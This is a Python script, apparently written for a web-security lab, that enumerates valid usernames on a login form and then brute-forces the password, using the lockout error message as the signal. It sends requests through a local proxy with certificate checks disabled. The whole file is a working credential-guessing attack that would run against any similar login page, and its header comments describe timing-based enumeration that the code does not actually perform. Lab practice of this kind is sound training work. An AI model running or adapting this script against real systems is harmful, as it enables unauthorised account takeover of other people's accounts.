import sys

import requests
import urllib3
from bs4 import BeautifulSoup

# Step 2: take in the requested url as an input parameter
# Step 3: set up data needed for sending POST or get request (starting off with POST)
# Step 4: User enumeration based on the time elapsed between sending request and receiving response
# Step 5: Password Brute force using the username found within step 4

# As labs use https, in order to send requests to Burp and other Proxies without lots of warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#  Read in wordlists for username and password
def read_wordfile(wordfile):
    # open passed wordfile file
    file = open(wordfile)

    # read file
    wordfile_list = file.readlines()

    # close file
    file.close()

    return wordfile_list


# prepare the payloads to be used for POST requests
def prepare_payload(username, password):
    # Prepare the payload
      return {"username": f"{username}", "password": f"{password}"}


# perform_request will actually send the request using the payloads
def perform_request(url, username, password):
    # static data needed for request
    proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
    
    # ok:disabled-cert-validation
    response = requests.post(
        url,
        data=prepare_payload(username, password),
        allow_redirects=False,
        proxies=proxies,
        verify=False,
    )
    return response

# enumerate the returned login error by parsing the HTML
def grab_response_error(response, password_check):
    soup = BeautifulSoup(response.content, "html.parser")
    tag = soup.find("p", class_="is-warning")
    if not tag:
      return None

    # if username is being tested, then we will pass 
    if (tag.string == "Invalid username or password." and not password_check) or (tag.string == "You have made too many incorrect login attempts. Please try again in 1 minute(s)." and password_check):
        return tag.string
    return None

# logic for enumerating the correct username
def enumerate_usernames(url, usernames):
    hits = []
    for username in usernames:
        cleaned_text = username.replace("\n", "")
        for i in range(5):
          response = perform_request(url, cleaned_text, "password")
          if response:
              potential_hit = grab_response_error(response, False)
              if not potential_hit:
                  hits.append(cleaned_text)
                  break
              else:
                  continue
    return hits


# logic for enumerating the passwords
def brute_password(url, username, passwords):
    for password in passwords:
        #strip the text of any ending new line
        cleaned_text = password.replace("\n", "")
        response = perform_request(url, username, cleaned_text)

        # all requests for this lab are success code 200, have to look for the one that does not give an error
        potential_hit = grab_response_error(response, True)
        if potential_hit:
          continue
        return cleaned_text
        


def main():
    # ensure proper command line variables were passed
    if len(sys.argv) != 4:
        print(f"(+) Usage: {sys.argv[0]} <url> <usernames.txt> <passwords.txt>")
        print(
            f"(+) Example: {sys.argv[0]} www.example.com file/path/usernames file/path/passwords"
        )
        sys.exit(-1)

    # read in the wordlists
    usernames = read_wordfile(sys.argv[2])
    passwords = read_wordfile(sys.argv[3])

    # Enumerate username and password
    correct_username = enumerate_usernames(sys.argv[1], usernames)
    if correct_username == "":
        print("Unable to find correct username. Exiting...")
        return
    print(f"Correct username: {correct_username}" )
    correct_password = brute_password(sys.argv[1], correct_username[0], passwords)
    print(f"{correct_username[0]} and {correct_password}")

if __name__ == "__main__":
    main()
